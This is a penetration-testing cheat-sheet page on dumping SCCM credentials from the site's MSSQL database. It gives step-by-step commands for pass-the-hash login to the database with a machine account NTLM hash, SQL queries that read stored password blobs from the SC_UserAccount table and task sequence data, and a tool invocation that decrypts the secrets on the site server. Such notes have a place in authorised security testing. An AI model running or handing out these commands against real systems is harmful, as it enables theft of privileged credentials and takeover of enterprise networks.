# MSSQL Database

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/cred-5-mssql-database

## Description

Dump credentials from the site database

Site servers are granted sysadmin roles on their respective site databases. This is default and is a requirement for SCCM to function. If the site server machine account credentials have been obtained,  this  then allows for the SC_UserAccount table to be read and obtain encrypted passwords blobs for provisioned SCCM accounts which are stored within this table. 

When this attack is performed, the encrypted data blobs must be encrypted on the site server otherwise it is not possible to decrypt them.

## Requirements

1) Site database access

2) Access to the private key used for encryption stored on the primary site server

## Linux

### 1) Authenticate to the database

    impacket-mssqlclient  -windows-auth -hashes 'aad3b435b51404eeaad3b435b51404ee:fe7f671f719978e25111c8c196662006' 'SCCMLAB/MECM$'@192.168.60.12 

### 2) Dump account credentials

##### Connect to site database, view secrets

    USE CM_[Site Code]
    SELECT UserName,Password FROM SC_UserAccount

### 3) Dump Task Sequence data

    SELECT TS_ID, Name, Sequence FROM vSMS_TaskSequencePackage

## Windows

The same attack can be repeated as above in the Linux section for Windows when using mssqlclient.exe. If using a machine account mssqlclient.exe would be the preferred way of doing this, otherwise if you have access to a user who has admin rights of the site server database then SQLRecon or PowerUPSQL should be sufficient.

### 1) Authenticate to database

    mssqlclient.exe -windows-auth -hashes "aad3b435b51404eeaad3b435b51404ee:fe7f671f719978e25111c8c196662006" "SCCMLAB/MECM$"@192.168.60.12

##### Connect to site database, view secrets

    USE CM_[Site Code]
    SELECT UserName,Password FROM SC_UserAccount

### 2) Decrypt secrets

To decrypt the data, we need to run sccmdecrypt on the main site server.

    .\sccmdecrypt.net-4.5.exe [Value]

### NOTE: Needs to be run from an administrative shell on the main site server to decrypt the strings successfully

